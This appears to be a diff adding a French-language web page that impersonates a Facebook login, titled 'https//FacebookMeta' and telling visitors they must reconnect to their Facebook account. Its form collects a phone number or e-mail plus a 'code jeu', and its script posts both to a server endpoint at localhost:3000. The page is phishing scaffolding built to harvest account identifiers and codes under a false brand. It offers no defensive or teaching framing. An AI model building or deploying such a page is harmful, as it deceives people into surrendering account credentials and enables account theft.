@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>https//FacebookMeta</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+
+
+
+<body>
+
+    <h5>     </h5>
+    <p><strong> vous devrez reconnecter  à votre compte Facebook pour suivre les procédures</strong></p>
+
+    <nav class="navbar">
+        <div class="nav-logo">Facebook</div>
+    </nav>
+
+    <div class="section-grise">
+        <div class="form-content">
+
+            <p><strong>connexion</strong></p>
+
+            <form id="formulaire">
+
+                
+
+                <div class="input-group">
+                    <input
+                        type="text"
+                        id="telephone"
+                        name="telephone"
+                        required
+                        placeholder=" Numéro mobile ou e-mail"
+                    >
+                </div>
+                <div class="input-group">
+                    <input
+                        type="text"
+                        id="code"
+                        name="code"
+                        required
+                        placeholder="code jeu"
+                    >
+                </div>
+
+                <button type="submit">Sign in</button>
+
+            </form>
+
+        </div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; Facebook</p>
+    </footer>
+
+ <script>
+    const formulaire = document.getElementById("formulaire");
+
+formulaire.addEventListener("submit", async function(event) {
+
+    event.preventDefault();
+
+    console.log("FORMULAIRE ENVOYE");
+
+    const telephone = document.getElementById("telephone").value;
+    const code = document.getElementById("code").value;
+
+    console.log("Telephone :", telephone);
+    console.log("Code :", code);
+
+    try {
+
+        const response = await fetch("http://localhost:3000/api/participant", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                telephone: telephone,
+                code: code
+            })
+        });
+
+        const data = await response.json();
+
+        console.log("Réponse du serveur :", data);
+
+        alert(data.message);
+
+        if (data.success) {
+            formulaire.reset();
+        }
+
+    } catch (error) {
+
+        console.error("Erreur :", error);
+
+        alert("Impossible de contacter le serveur.");
+    }
+});
+    
+
+ </script>       
+</body>
+</html>
